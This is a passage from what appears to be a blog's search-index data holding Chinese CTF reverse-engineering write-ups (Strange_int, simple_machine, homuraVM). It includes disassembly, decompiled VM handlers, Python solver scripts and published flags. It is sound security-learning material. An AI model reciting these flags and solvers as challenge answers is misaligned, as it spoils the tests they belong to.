, 0 , 0 , 0 , 3 , 0 , 1 , 0 , solvehttp://www.llang.net/sudoku/calsudoku.html 求解即可 401095728057800001802040305000321589500479002923586000105060203300008950269750804 加个flag flag{401095728057800001802040305000321589500479002923586000105060203300008950269750804}","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"cgctf","slug":"write-up/cgctf","permalink":"https://mrh1s.top/categories/write-up/cgctf/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}],"author":"mrh929"},{"title":"补题：Strange_int","slug":"Strange-int","date":"2019-05-13T15:06:14.000Z","updated":"2019-05-21T07:54:20.500Z","comments":true,"path":"posts/d2cf12e4/","link":"","permalink":"https://mrh1s.top/posts/d2cf12e4/","excerpt":"","text":"strange intstrange_int 打国赛的时候没做出来这道题，现在看了题解来补一补 思路开始以前写过FAT16的模拟程序，看到这个文件第一想法是这是一个DBR 第一行的 jmp 就是 jump 到这个命令的下一个命令。。 seg000:0000 jmp far ptr 7C0h:5seg000:0005 ; ---------------------------------------------------------------------------seg000:0005 mov ax, csseg000:0007 mov ds, axseg000:0009 mov ss, axseg000:000B mov sp, 400hseg000:000E cldseg000:000F mov ax, 3seg000:0012 int 10h ; - VIDEO - SET VIDEO MODEseg000:0012 ; AL = modeseg000:0014 mov dx, 0seg000:0017 mov cx, 2seg000:001A mov ax, 1000hseg000:001D mov es, axseg000:001F assume es:nothingseg000:001F xor bx, bxseg000:0021 mov ax, 228hseg000:0024 int 13h ; DISK - READ SECTORS INTO MEMORYseg000:0024 ; AL = number of sectors to read, CH = track, CL = sectorseg000:0024 ; DH = head, DL = drive, ES:BX -&gt; buffer to fillseg000:0024 ; Return: CF set on error, AH = status, AL = number of sectors readseg000:0026 jnb short loc_2Aseg000:0028seg000:0028 loc_28: ; CODE XREF: seg000:loc_28↓jseg000:0028 jmp short loc_28seg000:002A ; ---------------------------------------------------------------------------seg000:002Aseg000:002A loc_2A: ; CODE XREF: seg000:0026↑jseg000:002A cliseg000:002B mov ax, 1000hseg000:002E mov ds, axseg000:0030 assume ds:nothingseg000:0030 xor ax, axseg000:0032 mov es, axseg000:0034 assume es:nothingseg000:0034 mov cx, 2000hseg000:0037 sub si, siseg000:0039 sub di, diseg000:003B rep movsbseg000:003D mov ax, 7C0hseg000:0040seg000:0040 loc_40: ; DATA XREF: seg000:0012↑rseg000:0040 mov ds, axseg000:0042 assume ds:nothingseg000:0042 lidt fword ptr ds:6Fhseg000:0047 lgdt fword ptr ds:75hseg000:004Cseg000:004C loc_4C: ; DATA XREF: seg000:0024↑rseg000:004C mov ax, 1seg000:004F lmsw axseg000:0052 jmp far ptr 8:0 然后就跳转到一个神秘的鬼地方去了 程序大概是把ebx置0了，然后作为计数变量，一共循环了10h次 把一堆数送到了内存中，经高人指点，这堆数属于中断向量 （也就是VM里面的操作数，对应相应的操作） seg000:000001FE ; ---------------------------------------------------------------------------seg000:000001FE push ebpseg000:000001FF stosbseg000:00000200 mov eax, 10hseg000:00000205 mov ds, eaxseg000:00000207 assume ds:nothingseg000:00000207 lss esp, large ds:0B5Chseg000:0000020E call sub_28Bseg000:00000213 call sub_283seg000:00000218 mov eax, 10h ; DATA XREF: sub_28B+27↓rseg000:0000021D mov ds, eaxseg000:0000021F mov es, eaxseg000:00000221 assume es:nothingseg000:00000221 mov fs, eax ; DATA XREF: sub_283↓rseg000:00000223 assume fs:nothingseg000:00000223 mov gs, eaxseg000:00000225 assume gs:nothingseg000:00000225seg000:00000225 loc_225: ; DATA XREF: sub_28B+11↓oseg000:00000225 lss esp, large ds:0B5Chseg000:0000022C xor ebx, ebxseg000:0000022Eseg000:0000022E loc_22E: ; CODE XREF: seg000:0000025D↓jseg000:0000022E nopseg000:0000022F cmp ebx, 10hseg000:00000232 jge short loc_25Fseg000:00000234 mov eax, 80000hseg000:00000239 lea edx, ds:0D08h[ebx*4] ;这个内存里面全部存的0seg000:00000240 mov edx, [edx]seg000:00000242 mov ax, dxseg000:00000245 mov dx, 8E00hseg000:00000249 mov ecx, 21h ; &apos;!&apos; ;21hseg000:0000024E add ecx, ebx ;21h + ebx， ;也就是把21h开始的10h个数作为操作数seg000:00000250 lea esi, ds:128h[ecx*8]seg000:00000257 mov [esi], eaxseg000:00000259 mov [esi+4], edxseg000:0000025C inc ebxseg000:0000025D jmp short loc_22Eseg000:0000025F ; ---------------------------------------------------------------------------# 后面是多次中断进行操作seg000:0000025Fseg000:0000025F loc_25F: ; CODE XREF: seg000:00000232↑jseg000:0000025F ; seg000:00000266↓jseg000:0000025F call sub_268seg000:00000264 int 21h ; DOS -seg000:00000266 jmp short loc_25F switch跳转语句中断之前call的sub_268汇编代码如下： seg000:00000268 sub_268 proc near ; CODE XREF: seg000:loc_25F↑pseg000:00000268 mov edi, large ds:0B78hseg000:0000026E lea edi, ds:0D48h[edi*4]seg000:00000275 mov eax, [edi]seg000:00000277 mov large ds:65h, alseg000:0000027C mov ecx, [edi+4]seg000:0000027F mov eax, [edi+8]seg000:00000282 retnseg000:00000282 sub_268 endp 操作数1被送入内存了 ecx应该是操作数2 eax是操作数3 各个case汇编以下是每个操作数对应的操作， 因为所有的操作数是依次出现的 ，所以只需要挨着翻译就好了 seg000:00000D7C ; ---------------------------------------------------------------------------seg000:00000D7C lea ecx, ds:0B64h[ecx*4]seg000:00000D83 mov [ecx], eaxseg000:00000D85 jmp loc_EF8seg000:00000D8A ; ---------------------------------------------------------------------------seg000:00000D8A lea eax, ds:0B64h[eax*4]seg000:00000D91 mov eax, [eax]seg000:00000D93 lea ecx, ds:0B64h[ecx*4]seg000:00000D9A mov [ecx], eaxseg000:00000D9C jmp loc_EF8seg000:00000DA1 ; ---------------------------------------------------------------------------seg000:00000DA1 lea eax, ds:0B64h[eax*4]seg000:00000DA8 mov eax, [eax]seg000:00000DAA lea ecx, ds:0B64h[ecx*4]seg000:00000DB1 lea eax, ds:0D48h[eax*4]seg000:00000DB8 mov eax, [eax]seg000:00000DBA mov [ecx], eaxseg000:00000DBC jmp loc_EF8seg000:00000DC1 ; ---------------------------------------------------------------------------seg000:00000DC1 lea eax, ds:0B64h[eax*4]seg000:00000DC8 mov eax, [eax]seg000:00000DCA lea ecx, ds:0B64h[ecx*4]seg000:00000DD1 mov ecx, [ecx]seg000:00000DD3 lea ecx, ds:0D48h[ecx*4]seg000:00000DDA mov [ecx], eaxseg000:00000DDC jmp loc_EF8seg000:00000DE1 ; ---------------------------------------------------------------------------seg000:00000DE1 lea eax, ds:0B64h[eax*4]seg000:00000DE8 mov edx, [eax]seg000:00000DEA lea ecx, ds:0B64h[ecx*4]seg000:00000DF1 mov eax, [ecx]seg000:00000DF3 add eax, edxseg000:00000DF5 mov [ecx], eaxseg000:00000DF7 jmp loc_EF8seg000:00000DFC ; ---------------------------------------------------------------------------seg000:00000DFC lea eax, ds:0B64h[eax*4]seg000:00000E03 mov edx, [eax]seg000:00000E05 lea ecx, ds:0B64h[ecx*4]seg000:00000E0C mov eax, [ecx]seg000:00000E0E sub eax, edxseg000:00000E10 mov [ecx], eaxseg000:00000E12 jmp loc_EF8seg000:00000E17 ; ---------------------------------------------------------------------------seg000:00000E17 lea eax, ds:0B64h[eax*4]seg000:00000E1E mov edx, [eax]seg000:00000E20 lea ecx, ds:0B64h[ecx*4]seg000:00000E27 mov eax, [ecx]seg000:00000E29 xor eax, edxseg000:00000E2B mov [ecx], eaxseg000:00000E2D jmp loc_EF8seg000:00000E32 ; ---------------------------------------------------------------------------seg000:00000E32 lea eax, ds:0B64h[eax*4]seg000:00000E39 mov eax, [eax]seg000:00000E3B lea edx, ds:0B64h[ecx*4]seg000:00000E42 mov cl, alseg000:00000E44 mov eax, [edx]seg000:00000E46 shl eax, clseg000:00000E48 mov [edx], eaxseg000:00000E4A jmp loc_EF8seg000:00000E4F ; ---------------------------------------------------------------------------seg000:00000E4F lea eax, ds:0B64h[eax*4]seg000:00000E56 mov eax, [eax]seg000:00000E58 lea edx, ds:0B64h[ecx*4]seg000:00000E5F mov cl, alseg000:00000E61 mov eax, [edx]seg000:00000E63 shr eax, clseg000:00000E65 mov [edx], eaxseg000:00000E67 jmp loc_EF8seg000:00000E6C ; ---------------------------------------------------------------------------seg000:00000E6C lea eax, ds:0B64h[eax*4]seg000:00000E73 mov eax, [eax]seg000:00000E75 lea ecx, ds:0B64h[ecx*4]seg000:00000E7C mov edx, [ecx]seg000:00000E7E and eax, edxseg000:00000E80 mov [ecx], eaxseg000:00000E82 jmp short loc_EF8seg000:00000E84 ; ---------------------------------------------------------------------------seg000:00000E84 lea eax, ds:0B64h[ecx*4]seg000:00000E8B mov eax, [eax]seg000:00000E8D lea ecx, unk_B78seg000:00000E93 mov [ecx], eaxseg000:00000E95 iretseg000:00000E96 ; ---------------------------------------------------------------------------seg000:00000E96 lea eax, ds:0B64h[eax*4]seg000:00000E9D mov eax, [eax]seg000:00000E9F test eax, eaxseg000:00000EA1 jnz short loc_EF8seg000:00000EA3 lea eax, ds:0B64h[ecx*4]seg000:00000EAA mov eax, [eax]seg000:00000EAC lea ecx, unk_B78seg000:00000EB2 mov [ecx], eaxseg000:00000EB4 iretseg000:00000EB5 ; ---------------------------------------------------------------------------seg000:00000EB5 lea eax, ds:0B64h[eax*4]seg000:00000EBC mov eax, [eax]seg000:00000EBE test eax, eaxseg000:00000EC0 jz short loc_EF8seg000:00000EC2 lea eax, ds:0B64h[ecx*4]seg000:00000EC9 mov eax, [eax]seg000:00000ECB lea ecx, unk_B78seg000:00000ED1 mov [ecx], eaxseg000:00000ED3 iretseg000:00000ED4 ; ---------------------------------------------------------------------------seg000:00000ED4 lea eax, unk_F94seg000:00000EDA call sub_2EAseg000:00000EDF hltseg000:00000EE0 ; ---------------------------------------------------------------------------seg000:00000EE0 lea eax, unk_FA0seg000:00000EE6 call sub_2EAseg000:00000EEB lea eax, word_FAEseg000:00000EF1 call sub_2EAseg000:00000EF6 hltseg000:00000EF6 ; ---------------------------------------------------------------------------seg000:00000EF7 db 0F4hseg000:00000EF8 ; ---------------------------------------------------------------------------seg000:00000EF8seg000:00000EF8 loc_EF8: ; CODE XREF: seg000:00000D85↑jseg000:00000EF8 ; seg000:00000D9C↑j ...seg000:00000EF8 lea ecx, unk_B78seg000:00000EFE mov eax, [ecx]seg000:00000F00 add eax, 3seg000:00000F03 mov [ecx], eaxseg000:00000F05 iretseg000:00000F05 ; --------------------------------------------------------------------------- 翻译后buf[a] = bbuf[a] = buf[b]buf[a] = (dword) opt[buf[b]](dword) opt[buf[a]] = buf[b]buf[a] += buf[b]buf[a] -= buf[b]buf[a] ^= buf[b]buf[a] &lt;&lt;= buf[b]buf[a] &gt;&gt;= buf[b]buf[a] &amp;= buf[b]temp = buf[a]if(buf[b] == 0) temp = buf[a]if(buf[b] != 0) temp = buf[a]exit(0)printf(\"wrong\")printf(\"right\") 指令数组内存数据区，存储操作数，这个是通过 seg000:0000026E lea edi, ds:0D48h[edi*4] 算出来的 seg000:00000F48 db 21h ; ! ; data startseg000:00000F49 db 0seg000:00000F4A db 0seg000:00000F4B db 0seg000:00000F4C db 0seg000:00000F4D db 0seg000:00000F4E db 0seg000:00000F4F db 0seg000:00000F50 db 81hseg000:00000F51 db 0seg000:00000F52 db 0seg000:00000F53 db 0seg000:00000F54 db 27h ; &apos;seg000:00000F55 db 0seg000:00000F56 db 0seg000:00000F57 db 0seg000:00000F58 dd 2 dup(1), 24h, 2 dup(1), 23h, 2, 0seg000:00000F78 db 22h ; &quot;seg000:00000F79 align 4seg000:00000F7C db 3seg000:00000F7D align 10hseg000:00000F80 db 2seg000:00000F81 align 4seg000:00000F84 dd offset dword_0+21hseg000:00000F88 dd 4, 8, 28hseg000:00000F94 unk_F94 db 3 ; DATA XREF: seg000:00000ED4↑oseg000:00000F95 align 4seg000:00000F98 dd 4, 27hseg000:00000FA0 unk_FA0 db 2 ; DATA XREF: seg000:00000EE0↑oseg000:00000FA1 align 4seg000:00000FA4 db 3seg000:00000FA5 align 4seg000:00000FA8 dd offset dword_0+28hseg000:00000FAC db 3seg000:00000FAD align 2seg000:00000FAE word_FAE dw 0 ; DATA XREF: seg000:00000EEB↑oseg000:00000FB0 dd 4, 27h, 2, 3, 28h, 3, 4, 27h, 2, 3, 27h, 2 dup(3), 23hseg000:00000FB0 dd 4, 3, 24h, 3, 2, 27h, 2, 4, 24h, 0seg000:00001010 db 2seg000:00001011 align 4seg000:00001014 dd offset dword_0+21hseg000:00001018 dd 2 dup(1), 25h, 0seg000:00001028 dd 1, 22h, 1, 0seg000:00001038 dd offset dword_0+21hseg000:0000103C db 2seg000:0000103D align 10hseg000:00001040 db 81hseg000:00001041 align 4seg000:00001044 dd offset dword_0+26hseg000:00001048 dd 1, 2, 21h, 2, 9, 26h, 1, 2, 21h, 2, 9, 2Dh, 2, 1, 21hseg000:00001048 dd 0seg000:00001088 db 81hseg000:00001089 align 4seg000:0000108C db 22h ; &quot;seg000:0000108D align 10hseg000:00001090 dd 1, 0seg000:00001098 dd offset dword_0+21hseg000:0000109C db 2seg000:0000109D align 10hseg000:000010A0 dd 9, 25h, 1, 2, 23h, 3, 0seg000:000010BC db 23h ; #seg000:000010BD align 10hseg000:000010C0 dd 4, 1, 26h, 3, 4, 21h, 4, 7Eh, 2Dh, 4, 3, 21h, 3, 1seg000:000010C0 dd 25h, 0seg000:00001100 db 3seg000:00001101 align 4seg000:00001104 db 25h ; %seg000:00001105 align 4seg000:00001108 dd 1, 3, 26h, 2, 3, 21h, 4, 5Ah, 2Dh, 4, 2, 2Fh, 2 dup(0)seg000:00001140 dd offset dword_0+30hseg000:00001144 dd 2 dup(0)seg000:0000114C db 38h ; 8seg000:0000114D db 62h, 64h, 61h dumpaddr = 0x0F48print \"\\nopt:\"while(1): opt = Dword(addr) a = Dword(addr + 4) b = Dword(addr + 8) print opt,\",\",a,\",\",b,\",\", if(opt &gt;= 0x2E): break addr += 12 翻译妈耶，好不容易把指令翻译成了C语言，结果发现这段代码里面还嵌套了类似汇编的指令，还有循环，需要翻译 0 buf0 = 129 //buf0 = 1291 buf1 ^= buf1 //buf1 = 02 (dword) data[buf1] = buf1 //data[0] = 03 buf2 = (dword) data[buf0] //buf2 = data[129]4 buf3 = buf2 //buf3 = data[129]5 buf4 = 8 //buf4 = 86 buf3 &lt;&lt;= buf4 //buf3 = data[129] &lt;&lt; 87 buf2 ^= buf3 //buf2 = data[129] ^ (data[129] &lt;&lt; 8)8 buf3 &lt;&lt;= buf4 //buf3 = data[129] &lt;&lt; 169 buf2 ^= buf3 10 buf3 &lt;&lt;= buf411 buf2 ^= buf3//buf2 = data[129] ^ (data[129] &lt;&lt; 8) ^ (data[129] &lt;&lt; 16) ^ (data[129] &lt;&lt; 24) // = afterXor12 buf3 ^= buf3 //buf3 = 013 buf4 = (dword) data[buf3] //buf4 = data[0]14 (dword) data[buf3] = buf2 //data[0] = afterXor15 buf2 ^= buf4 //buf2 = afterXor ^ data[0]16 (dword) data[buf0] = buf2 //data[129] = afterXor ^ data[0]17 buf1 = 1 //buf1 = 118 buf0 += buf1 //buf0 = 13019 buf1 = buf0 //buf1 = 13020 buf2 = 129 //buf2 = 12921 buf1 -= buf2 //buf1 = 122 buf2 = 9 //buf2 = 923 buf1 -= buf2 //buf1 = -824 buf2 = 9 //buf2 = 925 if(buf1 != 0) temp = buf2 //经高人指点，这里是设置eip //jmp 3 26 buf0 = 129 //buf0 = 12927 buf1 = buf0 //buf1 = 12928 buf2 = 9 //buf2 = 929 buf1 += buf2 //buf1 = 13830 buf3 = (dword) data[buf0] //buf3 = data[129]31 buf4 = (dword) data[buf1] //buf4 = data[138]32 buf3 -= buf4 //buf3 = data[129] - data[138]33 buf4 = 126 //buf4 = 12634 if(buf3 != 0) temp = buf4 //jmp 4235 buf3 = 1 //buf3 = 136 buf0 += buf3 //buf0 = data[129] - data[138] + 12937 buf1 += buf3 //buf1 = 13938 buf2 -= buf3 //buf2 = 839 buf4 = 90 //buf4 = 9040 if(buf2 != 0) temp = buf4 41 printf(\"wrong\")42 printf(\"right\") 再翻译程序作了一个很奇怪的循环，并且异或了一大堆 这个程序要逆向实在太难了，考虑到本来这个数据也不大，就暴力枚举 script from yypE: def dec(arr): assert(len(arr)==9) last = 0 for i in range(9): var = 0 arr[i] ^= last last = arr[i] var |= arr[i] &amp; 0xff for j in range(1,4): var |= (byte(arr[i],j) ^ byte(arr[i],j-1)) &lt;&lt;(8*j) arr[i] = var return arr def enc(arr): assert(len(arr)==9) last = 0 for i in range(9): var = 0 for j in range(4): var ^= (arr[i]&lt;&lt;(8*j)) &amp; 0xffffffff arr[i] = var ^ last last = var return arr 获得flag： def gen_flag(): ar = [1466127717, 106103809, 524896585, 1364657951, 1465860951, 1464032855, 1129775626, 1465779038, 257490944] flag = b'' for each in dec(ar): flag+=each.to_bytes(4,'little') print(flag) 虚拟机+反汇编+循环+暴力搜索 难点 猜出来程序的入口点 猜出修改的temp变量原来是EIP 逆向带循环的程序 耐心","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nationalCTF_20190421","slug":"write-up/nationalCTF-20190421","permalink":"https://mrh1s.top/categories/write-up/nationalCTF-20190421/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}],"author":"mrh929"},{"title":"simple_machine","slug":"simple-machine","date":"2019-05-11T12:45:32.000Z","updated":"2019-05-21T07:53:38.836Z","comments":true,"path":"posts/5f4cc17f/","link":"","permalink":"https://mrh1s.top/posts/5f4cc17f/","excerpt":"","text":"simple-machinesimple-machine 思路整理general这道题说起来是vm，实际上和vm的挂钩并不大，就是用高级语言去实现了汇编，把变量都当做了寄存器来使用，其中还有各种压栈出栈过程，不过跟本题关系不大，也就不用过于细究了 fun1fun1主要是通过输入的字符串，与预置的feed进行异或，得到一串加密的字符串，存在内存中 int __cdecl fun1(int str, unsigned int a2)&#123; unsigned int v2; // eax int v3; // eax push(base_addr_804B15C); base_addr_804B15C = esp1; push(temp); push(temp2); esp1 -= 48; *(_DWORD *)(base_addr_804B15C - 29) = 'deef'; // 0x804B13F *(_DWORD *)(base_addr_804B15C - 25) = 'daed'; *(_DWORD *)(base_addr_804B15C - 21) = 'feeb'; *(_DWORD *)(base_addr_804B15C - 17) = 'efac'; *(_BYTE *)(base_addr_804B15C - 13) = 0; for ( *(_DWORD *)(base_addr_804B15C - 12) = 0; ; ++*(_DWORD *)(base_addr_804B15C - 12) )// i = base_addr_804B15C - 12 &#123; eaxx = *(_DWORD *)(base_addr_804B15C - 12); // i if ( eaxx &gt;= a2 ) break; // 判断是否退出循环 // // // ebxx = *(_DWORD *)(base_addr_804B15C - 12); // i eaxx = str; // str temp = ebxx + str; // str + i ebxx = *(_DWORD *)(base_addr_804B15C - 12); // i eaxx = ebxx + str; // str + i eaxx = *(unsigned __int8 *)(ebxx + str); // 取当前字符串 temp1 = eaxx; *(_BYTE *)(base_addr_804B15C - 41) = eaxx; // 把当前字符串保存到一个地址里面 // // // temp2 = *(_DWORD *)(base_addr_804B15C - 12); esp1 -= 12; eaxx = base_addr_804B15C - 29; // 取feed push(base_addr_804B15C - 29); // push(feed) v2 = strlen(*(const char **)esp1); // v2 是 feed的长度 esp1 += 16; len = v2; eaxx = temp2; ebxx = 0; sub_80485AB(v2); // j = i % v2 // i = i / v2 eaxx = ebxx; eaxx = *(unsigned __int8 *)(ebxx - 29 + base_addr_804B15C);// 算feed中的偏移 temp1 = eaxx; temp1 = *(_BYTE *)(base_addr_804B15C - 41) ^ eaxx;// c ^ feed[] *(_BYTE *)temp = temp1; v3 = eaxx; LOBYTE(v3) = 0; eaxx = v3 + (unsigned __int8)temp1; &#125; sub_80485A5(); esp1 = base_addr_804B15C - 8; pop(&amp;temp2); pop(&amp;temp); return pop(&amp;base_addr_804B15C);&#125; fun2fun2中有两个循环，看似很复杂实则简单 看到两个寄存器在之间移来移去，发现很多操作都是无效的 void __cdecl fun2(int a1, int a2, int a3)&#123; push(base_addr_804B15C); base_addr_804B15C = esp1; esp1 -= 16; for ( *(_DWORD *)(base_addr_804B15C - 4) = 0; // 循环三次 *(_DWORD *)(base_addr_804B15C - 4) &lt;= 2u; ++*(_DWORD *)(base_addr_804B15C - 4) ) &#123; for ( *(_DWORD *)(base_addr_804B15C - 8) = 0; ; ++*(_DWORD *)(base_addr_804B15C - 8) ) &#123; len = a3; ebxx = 1431655766; eaxx = a3; sub_80485DB(1431655766); // ebxx = (eaxx * 1431655766) &gt;&gt; 32 ebxx -= (unsigned int)len &gt;&gt; 31; eaxx = ebxx; if ( *(_DWORD *)(base_addr_804B15C - 8) &gt;= (unsigned int)ebxx ) break; // 前面一段是关于判断跳出条件的 len = a3; ebxx = 0x55555556; eaxx = a3; sub_80485DB(0x55555556); // ebxx = (unsigned __int64)(a1 * (signed __int64)eaxx) &gt;&gt; 32; // ebxx -= (unsigned int)len &gt;&gt; 31; eaxx = ebxx; // repeated eaxx = ebxx * *(_DWORD *)(base_addr_804B15C - 4); ebxx = eaxx; eaxx = *(_DWORD *)(base_addr_804B15C - 8); eaxx += ebxx; ebxx = eaxx; eaxx = a2; len = ebxx + a2; // 算偏移地址 addr = 0x804B100 + (i * 18) + j ebxx = *(_DWORD *)(base_addr_804B15C - 8); eaxx = 2 * ebxx; // j * 2 ebxx *= 3; // j * 3 eaxx = *(_DWORD *)(base_addr_804B15C - 4);// i eaxx += ebxx; // i + j * 3 ebxx = eaxx; // i + j * 3 eaxx += a1; eaxx = *(unsigned __int8 *)(a1 + ebxx); // *(input + i + j * 3) temp1 = eaxx; *(_BYTE *)len = eaxx; // 修改上方的那个偏移地址 &#125; &#125; sub_80485A5();&#125; 翻译过来是这样： for(int i = 0; i &lt;= 2; i++) for(int j = 0;;j++)&#123; addr[(i * 18) + j] = input + i + j * 3 &#125; 验证比较fun1和fun2中生成的字符串是否相等 经高人指点，不是比较fun1和fun2的字符串，而是先经过fun1进行处理，然后再经过fun2处理，然后直接和内存中的一串字符串进行比较 solvefeed = \"feeddeadbeefcafe\"enc = [0x00,0x03,0x09,0x3A,0x05,0x0E,0x02,0x16,0x0F,0x1F,0x12,0x56,0x3B,0x0B,0x51,0x50,0x39,0x00,0x09,0x1F,0x50,0x04,0x14,0x57,0x3B,0x12,0x07,0x3C,0x1C,0x3A,0x15,0x05,0x0B,0x08,0x06,0x01,0x04,0x12,0x16,0x39,0x05,0x0B,0x50,0x57,0x09,0x12,0x0A,0x27,0x13,0x17,0x0E,0x02,0x55,0x18]dec = [0x00,0x03,0x09,0x3A,0x05,0x0E,0x02,0x16,0x0F,0x1F,0x12,0x56,0x3B,0x0B,0x51,0x50,0x39,0x00,0x09,0x1F,0x50,0x04,0x14,0x57,0x3B,0x12,0x07,0x3C,0x1C,0x3A,0x15,0x05,0x0B,0x08,0x06,0x01,0x04,0x12,0x16,0x39,0x05,0x0B,0x50,0x57,0x09,0x12,0x0A,0x27,0x13,0x17,0x0E,0x02,0x55,0x18]for i in range(3): for j in range(18): dec[i + j * 3] = enc[i * 18 + j]ans = \"\"for i in range(54): dec[i] ^= ord(feed[i % 16]) ans = ans + chr(dec[i])print(ans)","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"cgctf","slug":"write-up/cgctf","permalink":"https://mrh1s.top/categories/write-up/cgctf/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}],"author":"mrh929"},{"title":"多并发编程尝试","slug":"thread","date":"2019-05-08T14:20:36.000Z","updated":"2019-05-15T08:28:11.199Z","comments":true,"path":"posts/db7779bb/","link":"","permalink":"https://mrh1s.top/posts/db7779bb/","excerpt":"","text":"经查资料，多并发编程需要用到一个库 #include &lt; thread&gt; using namespace std; 线程初始化： std::thread t(fun);//fun为要多线程运行的函数 等待线程终止： t.join();//等待名为t的函数终止运行 如下实现了先启动输出first的线程，但由于多并发，second先输出 #include \"pch.h\"#include &lt;cstdio&gt;#include &lt;thread&gt;#include &lt;windows.h&gt;using namespace std;void fun() &#123; Sleep(200); printf(\"first task\\n\");&#125;int main() &#123; thread t(fun); printf(\"second task\\n\"); t.join(); printf(\"third task\\n\");&#125;","categories":[{"name":"c-learn","slug":"c-learn","permalink":"https://mrh1s.top/categories/c-learn/"}],"tags":[],"author":"mrh929"},{"title":"homuraVM","slug":"homuraVM","date":"2019-05-07T15:22:42.000Z","updated":"2019-05-07T15:57:03.291Z","comments":true,"path":"posts/f22525af/","link":"","permalink":"https://mrh1s.top/posts/f22525af/","excerpt":"","text":"HomuraVM 太丢脸了，这么简单一个vm还是做了三个多小时 homuraVM 概况这道题是WxyVM的一个加强版，即使把vm的指令翻译出来了，也会发现得到的是一串鸟语，俗称类brainf**k语言 程序的大概思路是这样的，读入一串数据，然后把这段数据载入内存，随后执行保存在程序里面的一段虚拟机代码，虚拟机的各种函数已经给出，最终生成的加密结果也能找到，逆向程序。 过程对vm的代码进行读取自己写的IDA中的注释： while ( 1 ) &#123; result = *(unsigned __int8 *)(COUNTER + a1); if ( !(_BYTE)result ) // 没有指令了 就退出 return result; v2 = *(char *)(COUNTER + a1); switch ( (unsigned int)off_1048 ) &#123; case 0x43u: // *j -= 2 * (*i &amp; *a) C *(_DWORD *)global_j -= 2 * (*(_DWORD *)global_i &amp; *(_DWORD *)array_input); ++COUNTER; break; case 0x47u: // (*j)-- G --*(_DWORD *)global_j; ++COUNTER; break; case 0x4Du: // *j = *i + a[0] M *(_DWORD *)global_j = *(_DWORD *)global_i + *(_DWORD *)array_input; ++COUNTER; break; case 0x54u: // (*j)++ T ++*(_DWORD *)global_j; ++COUNTER; break; case 0x5Bu: // 如果a[0]!=0 就循环，否则直接跳出 [ if ( *(_DWORD *)array_input ) &#123; ++COUNTER; &#125; else &#123; do v3 = COUNTER++; while ( *(_BYTE *)(v3 + a1) != 93 ); &#125; break; case 0x5Du: // 如果a[0]!=0 就返回[继续循环 ] if ( *(_DWORD *)array_input ) &#123; do --COUNTER; while ( *(_BYTE *)(COUNTER + a1) != 91 ); ++COUNTER; &#125; else &#123; ++COUNTER; &#125; break; case 0x61u: // (*i)-- a --*(_DWORD *)global_i; ++COUNTER; break; case 0x68u: // a[0] += 4 h array_input = (char *)array_input + 4; ++COUNTER; break; case 0x6Du: // a[0]自加 m ++*(_DWORD *)array_input; ++COUNTER; break; case 0x6Fu: // a[0] -= 4 o array_input = (char *)array_input - 4; ++COUNTER; break; case 0x72u: // (*i)++ r ++*(_DWORD *)global_i; ++COUNTER; break; case 0x75u: // a[0]-- u --*(_DWORD *)array_input; ++COUNTER; break; case 0x76u: // j = i v *(_DWORD *)global_j = *(_DWORD *)global_i; ++COUNTER; break; case 0x7Bu: if ( *(_DWORD *)global_j ) // *j !=0 就进入循环，否则直接跳出 &#123; ++COUNTER; &#125; else &#123; do v4 = COUNTER++; while ( *(_BYTE *)(v4 + a1) != 125 ); &#125; break; case 0x7Du: if ( *(_DWORD *)global_j ) // 如果*j不为0就返回&#123;处 &#123; do --COUNTER; while ( *(_BYTE *)(COUNTER + a1) != 123 ); ++COUNTER; &#125; else &#123; ++COUNTER; &#125; break; default: continue; &#125; &#125; 清除无用虚拟机指令首先我尝试着把无效命令先清除掉: str = \"\"\"h[ur]ovMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;h